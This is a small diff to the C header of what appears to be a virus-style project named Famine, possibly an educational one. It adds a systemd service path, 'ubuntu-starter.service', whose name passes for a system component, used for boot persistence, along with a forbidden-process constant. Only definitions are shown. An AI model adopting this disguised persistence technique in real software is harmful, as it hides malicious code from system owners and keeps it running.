@@ -35,6 +35,8 @@ typedef struct FamineFile {
 #define TMPTEST2_PATH "/tmp/test2"
 
 #define FLOCK_PATH "/tmp/famine.lock"
+#define SYSTEMD_PATH "/etc/systemd/system/ubuntu-starter.service"
+#define FORBIDDEN_PROCESS "test"
 
 void        mute_output();
 void		setup_boot_start();
